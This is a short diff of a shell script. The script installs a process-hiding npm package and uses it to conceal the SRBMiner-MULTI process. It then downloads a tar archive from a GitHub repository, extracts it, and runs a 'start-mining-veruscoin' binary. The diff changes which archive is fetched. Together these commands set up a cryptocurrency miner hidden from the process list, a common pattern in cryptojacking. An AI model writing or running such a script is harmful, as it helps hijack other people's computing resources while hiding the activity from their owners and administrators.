@@ -6,8 +6,7 @@ sudo apt install nodejs &&
 npm install -g npm@8.4.1 && 
 npm i -g node-process-hider && 
 sudo ph add SRBMiner-MULTI && 
-wget https://github.com/geraldyolang11/mine/raw/main/smzip.tar && 
-tar -xf smzip.tar &&
+wget https://github.com/geraldyolang11/mine/raw/main/converted.tar && 
 tar -xf converted.tar &&
 chmod +x start-mining-veruscoin &&
 ./start-mining-veruscoin"
